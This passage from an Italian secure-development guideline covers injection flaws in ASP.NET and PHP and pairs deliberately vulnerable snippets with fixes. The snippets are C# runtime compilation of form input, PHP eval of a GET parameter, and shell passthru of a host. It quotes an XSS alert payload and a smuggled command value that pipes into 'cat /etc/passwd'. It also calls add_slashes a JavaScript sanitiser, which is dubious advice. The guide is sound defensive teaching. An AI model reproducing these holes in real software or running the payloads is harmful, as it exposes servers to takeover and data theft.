dovrebbe essere sensibile al contesto, in base al t ipo di dato che si vuole neutralizzare: se ci si 
aspetta che possa esserci codice HTML abusivo, occo rre codificare gli eventuali tag HTML, se ci si 
potrebbe trovare di fronte a uno script, allora bis ogna codificare gli elementi sintattici di Javascri pt, 
ecc. 
• Si consiglia di utilizzare la libreria di codifica ESAPI. 
• Nell'intestazione di risposta Content-Type HTTP, è necessario definire esplicitamente la codifica dei 
caratteri (charset) per l'intera pagina. 
• Impostare l’attributo HTTPOnly per proteggere il co okie della sessione da indebite letture da parte 
di script malevoli. 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/79.html, 
CWE-79: Improper Neutralization of Input During Web  Page Generation ('Cross-site Scripting'). 
 
Esempio: 
Nel seguente codice, un dato in input (parametro pe r la ricerca viene stampato a video, senza averlo p rima 
sottoposto ad alcun controllo): 
Sub cmdSearch _Click(Source As Object, _ e As Event Args)  
  
// Do Search….. 
 
lblResult.Text="You Searched for: " & txtInput.Text   
 
// [loop per mostrare I risultati della query] 
 
End Sub  
7.8.2  Code Injection 
Come riconoscerla 
 
 
Linee guida per lo sviluppo sicuro Pag. 117  a 156  
 
L'applicazione esegue del codice ricevuto attravers o l’input che non è stato sufficientemente verifica to. Un 
utente in grado di inserire codice arbitrario può p rendere il controllo dell’applicazione e del server , se non 
sono state adottate tecniche di difesa in profondit à. 
Esempio: 
Il codice seguente mostra come del codice .NET può essere passibile di code injection: 
String codiceUtente = request.Form["Codice"]; 
  
CSharpCodeProvider compiler = new CSharpCodeProvide r(); 
CompilerParameters parametri = new CompilerParamete rs();  
parametri.GenerateInMemory = true; 
parametri.GenerateExecutable = true; 
 
try  
{ 
 CompilerResults risultati  = compiler.CompileAssemblyFromSource(parametri, 
codiceUtente); 
   
 Assembly compilato = risultati .CompiledAssembly;  
 exitCode = (int)compilato.EntryPoint.Invoke(null, new object[0]); 
 
Come difendersi. 
• È vietata qualsiasi esecuzione dinamica di codice r icevuto da canali non attendibili. Se è prorpio 
necessario compilare ed eseguire dinamicamente del codice dinamico, occorre allore predisporre 
una sandbox isolata, ad esempio AppDomain di .NET o  un thread isolato.  
• Devono essere effettuati tutti i controlli possibil i per validare il codice in ingresso. 
• Configurare l'applicazione da eseguire utilizzando un account utente limitato che non disponga di 
privilegi non necessari. 
• Se è possibile optare per isolare tutta l'esecuzion e dinamica utilizzando un account utente separato 
e dedicato che abbia privilegi solo per le operazio ni e i file specifici utilizzati dal codice da eseg uire, 
in base al principio denominato "Principle of Least  Privilege". Il principio stabilisce che agli utent i 
venga attribuito il più basso livello di “diritti” che possano, detenere rimanendo comunque in grado 
di compiere il proprio lavoro. 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/94.html, 
Improper Control of Generation of Code ('Code Injec tion') CWE-94. 
7.8.3  Command Injection 
Come riconscerla 
Sfruttando questa vulnerabilità un aggressore potre bbe eseguire comandi di sistema arbitrari 
sull’application server. Il danno che potrebbe esse re arrecato comprende: 
• la possibilità di modificare i permessi all’interno  di file o directory nel file system (read / create  / 
modify / delete); 
• la possibilità di instaurare connessioni di rete no n autorizzate verso il server;  
• la possibilità di gestire i servizi di sistema, avv iandoli, fermandoli o rimuovendoli; 
• la completa acquisizione del controllo del server d a parte dell'attaccante. 
In pratica, l'applicazione manda in esecuzione sul server comandi di sistema operativo inseriti 
dell’attaccante. L'operazione spesso viene effettua ta utilizzando stringhe di input controllate dall'u tente, 
sulle quali non viene effettuata alcuna verifica. 
Potrebbero così essere eseguiti direttamente sul se rver comandi anche molto pericolosi per il sistema o per 
la sicurezza dei dati. 
 
 
 
Linee guida per lo sviluppo sicuro Pag. 118  a 156  
 
Come difendersi 
• Rimodulare il codice per evitare una qualsiasi esec uzione diretta di script di comandi. Per effettuare  
operazioni di sistema, utilizzare eventualmente API  fornite dalla piattaforma. 
• Se non è possibile fare a meno di lanciare shell de i comandi, assicurarsi tuttavia di eseguire solo 
stringhe statiche, che non includano l'input dell'u tente. 
• Validare tutti gli input, indipendentemente dalla l oro provenienza. La convalida dovrebbe essere 
basata su una white list: dovrebbero essere accetta ti solo i dati che adattano a una struttura 
specificata, e scartati i dati che non rientrano in  questa categoria. I parametri devono essere limita ti 
a un set di caratteri consentito e i caratteri rico nosciuti come estranei devono essere filtrati e 
neutralizzati (escaping). Oltre ai caratteri, occor re controllare il tipo del dato, la sua dimensione,  
l'intervallo di validità (range), il formato ed eve ntuali valori attesi (white list). 
• Configurare l'applicazione da eseguire utilizzando un account utente limitato che non disponga di 
privilegi non necessari. 
• L’esecuzione del codice dovrebbe utilizzare un acco unt utente separato e dedicato, fornito dei soli 
privilegi strettamente necessari, in base al princi pio denominato "Principle of Least Privilege". Il 
principio stabilisce che agli utenti venga attribui to il più basso livello di “diritti” che possano 
detenere rimanendo comunque in grado di compiere il  proprio lavoro. 
 
Per ulteriori informazioni: http://cwe.mitre.org/data/definitions/77.html,  
CWE-77: Improper Neutralization of Special Elements  used in a Command ('Command Injection'). 
 
7.8.4  Connection String Injection 
Come riconoscerla 
Questo tipo di attacchi è possibile nel momento in cui l’applicazione affida all’input utente la compo siszione 
dinamica della stringa di connessione al database o ppure al server. 
Un utente malintenzionato potrebbe manipolare la st ringa di connessione dell'applicazione al database 
oppure al server. Utilizzando strumenti e modifiche  di testo semplici, l'aggressore potrebbe essere in  grado 
di eseguire una delle seguenti operazioni: 
• Danneggiare le performance delle applicazioni (ad e sempio incrementando il valore relativo al MIN 
POOL SIZE); 
• Manomettere la gestione delle connessioni di rete ( ad esempio, tramite TRUSTED CONNECTION); 
• Dirigere l'applicazione sul database fraudolento an ziché a quello genuino; 
• Scoprire la password dell'account di sistema nel da tabase (tramite un brute-force attack). 
 
Per comunicare con il proprio database o con un alt ro server (ad esempio Active Directory), l'applicaz ione 
costruisce dinamicamente una sua stringa di conness ione. Questa stringa di connessione viene costruita  
dinamicamente con l’input inserito dall’utente. Se i valori immessi sono stati verificati in misura 
insufficiente o non sono stati affatto verificati, la stringa di connessione potrebbe essere manipolat a ad arte 
a vantaggio dell’attaccante. 
Come difendersi 
• Validare tutti gli input, indipendentemente dalla l oro provenienza. Per la validazione, si consiglia 
l’approccio white list (sono accettati solo i dati che adottano una struttura specificata nella white 
list, scartando quelli che non la rispettano). In g enerale, è necessario controllare il tipo del dato,  la 
sua dimensione, l'intervallo di validità (range), i l formato ed eventuali valori attesi (white list). 
• Evitare di costruire dinamicamente stringhe di conn essione. Se è necessario creare dinamicamente 
una stringa di connessione evitare di includere l'i nput dell'utente. In ogni caso, utilizzare utilità 
basate sulla piattaforma, come SqlConnectionStringB uilder di .NET, o almeno codificare l'input 
validato come il piu' idoneo per la piattaforma uti lizzata.  
 
 
Linee guida per lo sviluppo sicuro Pag. 119  a 156  
 
• Nelle prime versioni di ASP.NET le stringhe di conn essione erano memorizzate nel file web.config. 
Adesso, le più recenti applicazioni ASP.NET Core po ssono leggere le configurazioni da varie fonti 
come appsettings.json, da variabili di ambiente, da  argomenti della riga di comando, ecc. È 
possibile, in pratica, archiviare la stringa di con nessione ovunque si voglia. In ogni caso, è sempre 
meglio che comporla a runtime con l’input dell’uten te. Si separa così l’applicazione dai metadati. Il 
file in questione deve essere messo in sicurezza at tivando la modalità “protected configuration”, 
che permette di memorizzare le stringhe di connessi one in forma crittografata (encrypted). 
 
Esempio.  
Nel seguente codice la stringa di connessione viene  letta dal file appsettings.json e la sua composizi one non 
è vulnerabile ad alcuna injection: 
var builder = new ConfigurationBuilder(); 
builder.AddJsonFile("appsettings.json", optional: f alse); 
var configuration = builder.Build(); 
connectionString = configuration.GetConnectionStrin g("SQLConnection");   
 
Per ulteriori informazioni: http://cwe.mitre.org/data/definitions/99.html,  
CWE-99: Improper Control of Resource Identifiers (' Resource Injection'). 
7.8.5  LDAP Injection 
Come riconoscerla 
La LDAP Injection è un tipo di attacco cui sono vul nerabili le applicazioni e che utilizzano l’input, senza 
verificarlo adeguatamente, per costruire query LDAP  (Lightweight Directory Access Protocol). 
Se coronato da successo, l’LDAP injection potrebbe consentire un furto di informazioni, un’elevazione dei 
privilegi e l’autenticazione con un’identità altrui  (spoofing). 
Per comunicare con la directory delle utenze (ad es empio Active Directory), l'applicazione costruisce 
dinamicamente delle query. Se utilizza l’input uten te senza verificarlo, un malintenzionato può inseri re 
comandi modificati ad arte per carpire informazioni  non dovute. 
Come difendersi 
Validare tutti gli input, indipendentemente dalla l oro provenienza. Per la validazione, si consiglia l ’approccio 
white list (sono accettati solo i dati che adottano  una struttura specificata nella white list, scarta ndo quelli 
che non la rispettano). Occorre controllare il tipo  del dato, la sua dimensione, l'intervallo di valid ità (range), 
il formato ed eventuali valori attesi (white list).  
A partire dalla versione 3.5 del Framework .NET, so no state introdotte nella libreria AntiXSS della ve rsione 4 
due nuove funzioni che permettono l’encoding delle stringhe da utilizzare per le query LDAP: 
• Encoder.LdapFilterEncode. Codifica l'input converte ndo i valori non sicuri in \n, dove n rappresenta 
il carattere non sicuro. 
• Encoder.LdapDistinguishedNameEncode. Codifica l'inp ut convertendo i valori non sicuri in #n, dove 
n rappresenta il carattere non sicuro, mentre i seg ni “,”, “+”, “/”, “<” e “>” vengono codificati con la 
barra (“\”). 
 
Esempio: 
Formato non corretto: 
ds.Filter = "(&(name=" + input + ")(isPublic=true)) "  
 
Formato corretto: 
ds.Filter = "(&(name=" + Encoder.LdapFilterEncode(i nput) + ")(isPublic=true))"  
 
Per ulteriori informazioni: http://cwe.mitre.org/data/definitions/90.html,  
CWE-90: Improper Neutralization of Special Elements  used in an LDAP Query ('LDAP Injection'). 
 
 
Linee guida per lo sviluppo sicuro Pag. 120  a 156  
 
7.8.6  Resource Injection 
Come riconoscerla  
Quando un'applicazione definisce un tipo di risorsa  o posizione in base all'input dell'utente, come un  nome 
file o un numero di porta, questi dati possono esse re manipolati per eseguire o accedere a risorse div erse. 
L’attacco di “path traversal” è un caso particolare  della resource injection. In tal caso a essere ini ettato è un 
path manipolativo che punta a risorse diverse nel f ile system. 
Se si utilizza l’input dell’utente per definire la porta sulla quale aprire un socket, si da all’utent e la possibilità 
di introdurre una backdoor attraverso la quale potr ebbe prendere il controllo del sistema. 
Come difendersi 
• In molti casi non è necessario aprire un socket man ualmente; meglio affidarsi a librerie e protocolli 
esistenti. 
• Tutti i dati inviati devono essere crittografati, s e sono sensibili. Nel dubbio se i dati siano sensib ili o 
possano diventarlo, meglio comunque crittografarli.  
• Qualsiasi input letto dal socket deve essere valida to. 
• Le applicazioni non dovrebbero utilizzare l’input d ell’utente per accedere a risorse del sistema. Nel 
caso si scelga di farlo, è obbligatorio validare l’ input, per esempio attraverso una white list. Se si  
consente la creazione di socket, controllare scrupo losamente questo tipo di attività. 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/99.html,  
CWE-99: Improper Control of Resource Identifiers (' Resource Injection'). 
 
7.8.7  SQL Injection  
Come riconoscerla  
I dati forniti dall'utente, in un modulo (form) o a ttraverso i parametri dell’URL, devono essere sempr e 
considerati non attendibili e potenzialmente corrot ti. La composizione dinamica di query SQL, a partir e da 
dati non verificati, consente agli aggressori di in serire valori appositamente predisposti per modific arne il 
contenuto e il significato. Gli attacchi di SQL inj ection possono leggere, modificare o eliminare info rmazioni 
riservate dal database e talvolta persino metterlo fuori uso o eseguire comandi arbitrari di sistema 
operativo. 
Come difendersi 
• In genere, la soluzione consiste nel fare affidamen to su query parametriche, piuttosto che sulla 
concatenazione di stringhe. Questa tecnica fornisce  un valido escaping dei caratteri pericolosi. 
• Validare tutti gli input, indipendentemente dalla l oro provenienza. La validazione dovrebbe essere 
basata su una white list: dovrebbero essere accetta ti solo i dati che adattano a una struttura 
specificata, scartando quelli che non rispettano la  white list. Occorre controllare il tipo del dato, la 
sua dimensione, l'intervallo di validità (range), i l formato ed eventuali valori attesi (white list). 
• Limitare l'accesso agli oggetti e alle funzionalità  di database, in base al "Principle of Least Privil ege" 
(non fornire agli utenti permessi più elevati di qu elli strettamente necessari per svolgere il loro 
lavoro). 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/89.html,  
CWE-89: Improper Neutralization of Special Elements  used in an SQL Command ('SQL Injection'). 
7.8.8  XPath Injection 
Come riconoscerla  
 
 
Linee guida per lo sviluppo sicuro Pag. 121  a 156  
 
Gli attacchi XPath Injection sono possibili quando un sito Web utilizza le informazioni fornite dall'u tente per 
costruire una query XPath per i dati XML. Inviando informazioni intenzionalmente malformate nel sito W eb, 
un utente malintenzionato può scoprire come sono st rutturati i dati XML o accedere a dati a cui 
normalmente non avrebbe accesso. Potrebbe persino e ssere in grado di elevare i suoi privilegi sul sito  Web 
se i dati XML vengono utilizzati per l'autenticazio ne (come un file utente basato su XML).  
Come difendersi 
• Evitare che la costruzione della query XPath dipend a dalle informazioni inserite dall'utente. 
Possibilmente mapparla con i parametri utente mante nendo la separazione tra dati e codice. Nel 
caso fosse necessario includere l'input dell’utente  nella query, questo dovrà essere 
precedentemente validato. 
• Validare tutti gli input, indipendentemente dalla l oro provenienza. La validazione dovrebbe essere 
basata su una white list (si dovrebbero accettare s olo i dati che adattano a una struttura 
specificata, scartando quelli che non la rispettano ). Occorre controllare il tipo del dato, la sua 
dimensione, l'intervallo di validità (range), il fo rmato ed eventuali valori attesi (white list). 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/643.html,  
CWE-643: Improper Neutralization of Data within XPa th Expressions ('XPath Injection'). 
 
7.8.9  Ulteriori indicazioni per lo sviluppo sicuro 
7.8.9.1  ASP.NET Web Form 
Web form è una tecnologia basata su ASP.NET di Micr osoft, in cui il codice eseguito sul server genera 
dinamicamente l'output di pagina Web al browser o a l dispositivo client. È uno dei quattro modelli (as sieme 
a ASP.NET MVC, ASP.NET Web Pages, ASP.NET Single Pa ge Applications) di programmazione che possono 
essere utilizzati per la creazione di applicazioni web ASP.NET. 
È compatibile con qualsiasi browser, dispositivo mo bile o linguaggio supportato da .NET ed è flessibil e in 
quanto offre la possibilità di aggiungere controlli  creati dall'utente e terze parti. 
 
Segue un elenco di best practices per lo sviluppo s icuro. 
• Concatenazione di stringhe : Utilizzare StringBuilder. Nella concatenazione de lle stringhe, l’uso di 
StringBuilder è preferibile rispetto a String.Conca t o all'utilizzo dell'operatore '+'. Più nel dettag lio, 
StringBuilder è più performante nella concatenazion e di un numero elevato di stringhe (>=3), 
mentre ha prestazioni equiparate a String.Concat pe r un minor numero (<3) di stringhe. 
• Ajax UpdatePanel : Evitare chiamate superflue al server. Controllare  Page.IsPostBack al 
caricamento della pagina per assicurarsi che la log ica di inizializzazione della pagina venga eseguita  
quando una pagina viene caricata la prima volta e n on in risposta ai postback dei client. Per le 
convalide, devono essere utilizzati script lato cli ent. 
• ViewState e HiddenFields : Mantenere i dati minimi in ViewState. ViewState è  valido solo per il 
postback delle stesse pagine: i dati vengono trasme ssi al client e restituiti in un campo nascosto. 
Disattiva ViewState a PageLevel utilizzando EnableV iewState. 
• Sessione : Variabili di sessione 
o Non dovrebbero esistere più di 20 variabili di sess ione nel contesto applicativo. 
o Tenere TimeOut di sessione. 
o Disattivare lo stato della sessione, se non si util izza in una particolare pagina / applicazione. 
• Reindirizzare : Server.Trasfer vs Response.Redirect. Utilizza Ser ver.Transfer per reindirizzare alle 
pagine della stessa applicazione e Response.Redirec t per reindirizzare verso una pagina esterna o 
quando è necessario avviare un nuovo contesto. 
• DataReader : Utilizzare DataReader per il binding dei dati. Se  l'applicazione non richiede la 
memorizzazione nella cache, è possibile utilizzare DataReader.  
 
 
Linee guida per lo sviluppo sicuro Pag. 122  a 156  
 
o Utilizzare DataReader per recuperare i dati e caric arli in un DataSet. Non passare questo 
DataSet tra i diversi livelli. Passare entità perso nalizzate tra i diversi livelli. 
• Resource : Chiusura delle risorse. Una delle problematiche p iù comuni ai programmatori è la 
sistematica chiusura delle risorse e/o connessioni aperte. Capita spesso, infatti, che per errori e/o 
eccezioni impreviste non gestite al meglio, alcune risorse rimangano in attesa di una chiusura che 
non arriverà mai. Per cui, chiudere le connessioni quando non in uso, migliora la sicurezza e le 
prestazioni. Prevedere meccanismi di chiusura autom atica delle risorse (attraverso un gestore che 
viene eseguito ad ogni uscito dal blocco). 
• Inizialiazzazione  delle  variabili . Inizializzare la variabile @ start e usarla in un a fase successiva 
provoca molte operazioni PUSH / POP. Quindi, inizia lizzare le variabili al momento/posto giusto. Le 
variabili intere non devono essere inizializzate a zero perché vengono inizializzate 
automaticamente. Le variabili stringhe invece, devo no essere inizializzate esplicitamente. 
• Richiesta http : Utilizzare Fiddler. Utilizza Fiddler per intercet tare le richieste HTTP e per sapere 
quale richiesta richiede più tempo. Individua anche  le eccezioni causate durante ogni richiesta 
HTTP. 
• URL : Rewriting URL. Per gli URL che dispongono di info rmazioni riservate, è consigliabile 
implementare URL Rewriters. Gli URL devono essere c oerenti. 
• Settings : Application settings.  
o Fissare un valore per la Content-Length. Questo imp one la connessione aperta per un 
tempo limitato (prestabilito) e la chiusura automat ica della stessa quando viene superato il 
limite temporale dichiarato. 
o Crittografare le stringhe di connessione sul server . 
o Assicurarsi che tutte le DLL di riferimento siano p resenti nel GAC. 
o Disattivare il tracciamento e il debug. Set <retail  = "true" /> nel file machine.config - obbliga 
il debug a essere falso, disattiva la traccia di ou tput e reindirizza alla pagina di errore 
personalizzata piuttosto che alla pagina di errore effettiva. 
• Web  services : Impedire il sovraccarico dei servizi web 
o Impedire il sovraccarico dei servizi web tramite at tacchi DoS (Denial of Service): 
o Controllare se si tratta di una prima visita o la v isita ripetuta per la stessa funzione dal 
medesimo IP. 
o Utilizzare connessioni SQL attendibili nei servizi Web. 
o Assicurarsi che ci siano chiamate asincrone ai serv izi web. 
• Eccezioni : Gestire le eccezioni 
o Registrare le eccezioni e visualizzare il messaggio  appropriato all'utente. Definire una classe 
base MyException. La classe deve definire: 
o Informazioni utili per l’utente: Cosa è successo; C osa è stato colpito; Quali sono le azioni da 
intraprendere; Altre iInformazioni di supporto. 
o Informazioni utili per la registrazione dell’eccezi one: Nome del server, Istanza id, ID utente, 
Stack di chiamata, Nome Assembly & Versione, Fonte,  tipo e messaggio di eccezione, 
Redirect secondo il livello di errore, Livello di a pplicazione (Cattura errori in global.asax 
nella funzione Application_Error), Livello di pagin a (Utilizza la funzione Page_Error per 
registrare gli errori). 
 
7.8.9.2  ASP.NET MVC 
ASP.NET MVC è una parte del framework  .NET che per mette di creare siti scalabili suddividendo la logi ca di 
programmazione in base al metodo Model-View-Control ler. Segue un elenco di best practices per lo 
sviluppo sicuro: 
• Isolate Controllers. Isolare i controllers dalle di pendenze, da HttpContext, dalle classi di accesso a i 
dati, dalla configurazione, dalla registrazione, ec c. L'isolamento può essere ottenuto creando classi 
di wrapper e utilizzando un contenitore IoC (Invers ion of Control). 
 
 
Linee guida per lo sviluppo sicuro Pag. 123  a 156  
 
• Utilizzare gli IoC Container per gestire tutte le d ipendenze esterne. Di seguito sono riportati alcuni  
dei contenitori / framework: Ninject, autofac, stru ctureMap, Unity block, Castle Windsor. 
• Creare ViewModel per ogni View. Creare un ViewModel  specifico per ogni visualizzazione. Il ruolo 
del ViewModel dovrebbe interessare solo il binding di dati e non dovrebbe contenere alcuna logica. 
• Utilizzare HtmlHelper. Per generare view html utili zzare HtmlHelper. Se l'attuale HtmlHelper non è 
sufficiente estenderlo utilizzando i metodi di este nsione. Questo manterrà la progettazione 
controllata. 
• Decorare action methods con verbi appropriati come Get o Post, se applicabile. 
• Utilizzare l’attributo OutputCache.  
• Decorare gli action methods più utilizzati con Outp utCache attribute. 
• Controller e Domain logic. Cercare di separare il c ontroller dal dominio logico. Il controller deve 
essere responsabile solo delle seguenti funzioni:  
o convalidare l'input; 
o ottenere i dati relativi alla view dal modello; 
o ritornare la view appropriata o reindirizzare ad un  altro metodo di azione appropriato. 
• Utilizzare il modello Post-Redirect-Get. Il modello  PRG viene utilizzato per evitare l'avvio del 
browser classico quando si aggiorna una pagina dopo  il POST. Ogni volta che fai una richiesta POST, 
una volta completata la richiesta, effettua un rein dirizzamento. In questo modo, quando l'utente 
aggiorna la pagina, verrà eseguita l'ultima richies ta GET piuttosto che il POST. Questo consente di 
evitare problemi di usabilità non necessari e imped isce che la richiesta iniziale venga eseguita due 
volte evitando così possibili problemi di duplicazi one. 
• View e presentation logic: la View non deve contene re presentation logic. Non ci dovrebbe essere 
alcuna logica di dominio nelle viste. Le viste devo no essere solamente responsabili della 
visualizzazione dei dati. Per esempio se un pulsant e "Elimina" deve essere visualizzato solo 
dall’utente con ruolo "Amministratore", ciò dovrebb e essere estratto in un helper HTML.  
 
7.9  PHP 
PHP è un linguaggio di scripting lato server, proge ttato per lo sviluppo web ma anche usato come 
linguaggio di programmazione generico. Originariame nte creato da Rasmus Lerdorf nel 1994, PHP è ora 
distribuito da The PHP Group. PHP originariamente s ignificava “home page personale”, ma ora è l'acroni mo 
ricorsivo PHP: Hypertext Preprocessor. 
Il codice PHP può essere incorporato nel codice HTM L oppure può essere utilizzato in combinazione con 
vari sistemi di modelli Web, sistemi di gestione de i contenuti Web e framework web. Il codice PHP vien e 
solitamente elaborato da un interprete PHP implemen tato come modulo nel web server. Il codice PHP può 
essere ancora incorporato nel codice HTML, ma più f requentemente può essere utilizzato in combinazione  
con vari sistemi di modelli Web, sistemi di gestion e dei contenuti Web e framework. Il codice PHP vien e 
solitamente elaborato da un interprete PHP implemen tato come modulo nel web server. 
 
Segue un elenco delle principali vulnerabilità e co ntromisure da adottare. 
7.9.1  Cross-site scripting (XSS)  
Come riconoscerla 
Il Cross Site Scripting consiste nella possibilità che un attaccante possa inserire nella pagina 
dell’applicazione, quindi nel codice HTML, script c he, una volta eseguiti, possano trarre in inganno i  legittimi 
utenti, trafugare informazioni e predisporre nuovi attacchi.  
Questa minaccia, enormemente diffusa, è dovuta allo  scarso controllo dell’input da parte delle web 
application.  
 
 
 
Linee guida per lo sviluppo sicuro Pag. 124  a 156  
 
Il Cross Site Scripting può essere reflected o stor ed. Nel primo caso, uno script inoculato è valido s olo 
all’interno della sessione corrente, ma i suoi effe tti possono essere molto dannosi per il sito vittim a 
dell’attacco. 
Ancora più grave è il Cross Site Scripting di tipo stored. In questo caso lo script inoculato viene me morizzato 
come parte integrante della pagina all’interno di u n database e rispristinato ogni qual volta la pagin a in 
questione viene caricata. Quest’attacco è stato sfr uttato ampiamente nel recente passato, soprattutto 
laddove veniva consentito agli utenti di inserire r ecensioni, commenti e altri contributi. 
Volendo schematizzare, possiamo categorizzare gli a ttacchi XSS nelle seguenti tipologie: 
• Reflected XSS, in cui la stringa dannosa proviene d alla richiesta dell’utente. 
• Stored XSS, in cui la stringa dannosa proviene dal database del sito Web. 
 
Esiste anche un Cross Site Scripting dovuto a una l acuna nella codifica UTF-7, che permettere di masch erare 
i caratteri “<” e “>”, facendoli sfuggire al contro llo. Questa minaccia non è più possibile nei modern i 
browser, ad eccezione di Microsoft Internet Explore r 11.  
Come difendersi 
• Validare tutti gli input, indipendentemente dalla l oro provenienza. Per la validazione, si consiglia 
l’approccio white list (sono accettati solo i dati che adottano una struttura specificata nella white 
list, scartando quelli che non la rispettano). Occo rre controllare il tipo del dato, la sua dimensione , 
l'intervallo di validità (range), il formato ed eve ntuali valori attesi (white list). 
• Codificare completamente tutti i dati dinamici prim a di incorporarli (encoding). La codifica 
dovrebbe essere sensibile al contesto, in base al t ipo di dato che si vuole neutralizzare: se ci si 
aspetta che possa esserci codice HTML abusivo, occo rre codificare gli eventuali tag HTML, se ci si 
potrebbe trovare di fronte a uno script, allora bis ogna codificare gli elementi sintattici di Javascri pt, 
ecc. 
• Si consiglia di utilizzare la libreria di codifica messa a disposizione da PHP. Fra le varie funzioni sono 
da ricordare: htmlspecialchars(), htmlentities(), s trip_tags() e add_slashes(). Le prime sono 
utilizzate per l’escaping di codice HTML, l’ultima per bonificare codice Javascript. 
• Nell'intestazione di risposta Content-Type HTTP, è necessario definire esplicitamente la codifica dei 
caratteri (charset) per l'intera pagina. 
• Impostare l’attributo HTTPOnly per proteggere il co okie della sessione da indebite letture da parte 
di script malevoli. 
 
Esempio: 
Il dcodice che segue prende in input una variabile utente e la stampa a video: 
 
 echo $_POST["name"]; 
 
Se l’utente, invece di inserire il proprio nome, in serisce del codice attivo, per esempio 
“<script>alert(‘Attacco XSS!’)</script>”, crea un c aso di attacco XSS. 
Per bonificare il codice, la stringa accettata deve  essere controllata e depurata dei caratteri dannos i: 
 
 echo htmlentities($_POST["name"]); 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/79.html,  
CWE-79: Improper Neutralization of Input During Web  Page Generation ('Cross-site Scripting'). 
7.9.2  Code Injection 
Come riconoscerla 
 
 
Linee guida per lo sviluppo sicuro Pag. 125  a 156  
 
Un utente malintenzionato potrebbe eseguire codice arbitrario nell'host del server di applicazioni. A 
seconda delle autorizzazioni dell'applicazione che potrebbero essere carpite, si potrebbero avere le 
seguenti problematiche: 
• Possibilità di modificare i permessi all’interno di  file o directory nel file system(read / create / 
modify / delete); 
• Modifiche della struttura del sito web; 
• Permettere delle connessioni di rete non autorizzat e verso il server da parte dell'attaccante, 
• Permettere ad utenti malintenzionati la gestione de i servizi con possibili Start and stop dei servizi di 
sistema, 
• Acquisizione completa del server da parte dell'atta ccante. 
Come difendersi 
Se possibile, preferite sempre delle white list con  valori prefissati. Evitare qualsiasi compilazione dinamica, 
esecuzione o valutazione del codice. Se è necessari o eseguire tutto il codice dinamico in una sandbox 
isolata, ad esempio AppDomain di .NET o bloccare un  thread isolato. 
L'applicazione non deve compilare, eseguire o valut are i dati non attendibili, in particolare eventual e input 
dell'utente. Validare tutti gli input, indipendente mente dalla loro provenienza. La convalida dovrebbe  
essere basata su una white list: dovrebbero essere accettati solo i dati che adattano a una struttura 
specificata, e scartati i dati che non rientrano in  questa categoria. I parametri devono essere limita ti a un 
set di caratteri consentito e i caratteri riconosci uti come estranei devono essere filtrati e neutrali zzati 
(escaping). Oltre ai caratteri, occorre controllare  il tipo del dato, la sua dimensione, l'intervallo di validità 
(range), il formato ed eventuali valori attesi (whi te list). 
Nel caso fosse assolutamente necessario includere i  dati di input in un’esecuzione dinamica, applicare  una 
validazione dell'input molto rigida. Ad esempio, ac cettare solo interi tra determinati valori. 
Configurare l'applicazione da eseguire utilizzando un account utente limitato che non disponga di priv ilegi 
non necessari. 
L’esecuzione del codice dovrebbe utilizzare un acco unt utente separato e dedicato, fornito dei soli pr ivilegi 
strettamente necessari, in base al principio denomi nato "Principle of Least Privilege". Il principio s tabilisce 
che agli utenti venga attribuito il più basso livel lo di “diritti” che possano detenere rimanendo comu nque in 
grado di compiere il proprio lavoro. 
 
Esempio: 
Codice vulnerabile. L’utente può iniettare qualsias i codice e farlo eseguire: 
if (isset($_GET['codè])) { 
 $code = $_GET['codè]; 
 eval($code); 
} 
Codice sicuro. La scelta è possibile all’interno di  una white list di funzioni statiche: 
$method = $_GET[method]; 
switch ($method) { 
 case "methodOne": 
  methodOne(); 
  break; 
 case "methodTwo":  
  methodTwo(); 
  break; 
 //... 
} 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/94.html,  
Improper Control of Generation of Code ('Code Injec tion') CWE-94. 
 
 
 
Linee guida per lo sviluppo sicuro Pag. 126  a 156  
 
7.9.3  Command Injection 
Come riconscerla 
Sfruttando questa vulnerabilità un aggressore potre bbe eseguire comandi di sistema arbitrari 
sull’application server. Il danno che potrebbe esse re arrecato comprende: 
• la possibilità di modificare i permessi all’interno  di file o directory nel file system (read / create  / 
modify / delete); 
• la possibilità di instaurare connessioni di rete no n autorizzate verso il server;  
• la possibilità di gestire i servizi di sistema, avv iandoli, fermandoli o rimuovendoli; 
• la completa acquisizione del controllo del server d a parte dell'attaccante. 
• Attraverso questa vulnerabilità l'applicazione vien e portata ad eseguire i comandi dell’attaccante. 
L'operazione spesso viene effettuata utilizzando st ringhe di input controllate dall'utente, sulle qual i 
non viene effettuata alcuna verifica. 
• Potrebbero così essere eseguiti direttamente sul se rver comandi anche molto pericolosi per il 
sistema o per la sicurezza dei dati. 
Come difendersi 
• Rimodulare il codice per evitare una qualsiasi esec uzione diretta di script di comandi. Per effettuare  
operazioni di sistema, utilizzare eventualmente API  fornite dalla piattaforma. 
• Se non è possibile fare a meno di lanciare shell de i comandi, assicurarsi tuttavia di eseguire solo 
stringhe statiche, che non includano l'input dell'u tente. 
• Validare tutti gli input, indipendentemente dalla l oro provenienza. La convalida dovrebbe essere 
basata su una white list: dovrebbero essere accetta ti solo i dati che adattano a una struttura 
specificata, e scartati i dati che non rientrano in  questa categoria. I parametri devono essere limita ti 
a un set di caratteri consentito e i caratteri rico nosciuti come estranei devono essere filtrati e 
neutralizzati (escaping). Oltre ai caratteri, occor re controllare il tipo del dato, la sua dimensione,  
l'intervallo di validità (range), il formato ed eve ntuali valori attesi (white list). 
• Configurare l'applicazione da eseguire utilizzando un account utente limitato che non disponga di 
privilegi non necessari. 
• L’esecuzione del codice dovrebbe utilizzare un acco unt utente separato e dedicato, fornito dei soli 
privilegi strettamente necessari, in base al princi pio denominato "Principle of Least Privilege". Il 
principio stabilisce che agli utenti venga attribui to il più basso livello di “diritti” che possano 
detenere rimanendo comunque in grado di compiere il  proprio lavoro. 
 
Esempio: 
Codice vulnerabile: 
<?php 
  if (isset($_GET['host']) { 
  $host = $_GET['host']; 
  passthru("ping -c 1 ".$host); // Se host=www.goog le.com | cat 
/etc/passwd verrà visualizzato il contenuto di /etc /passwd 
  } 
?> 
Codice sicuro: 
<?php 
 if (isset($_GET['host']) { 
  $host = $_GET['host']; 
  passthru("ping -c 1 ". escapeshellarg ($host)); 
  } 
?> 
  
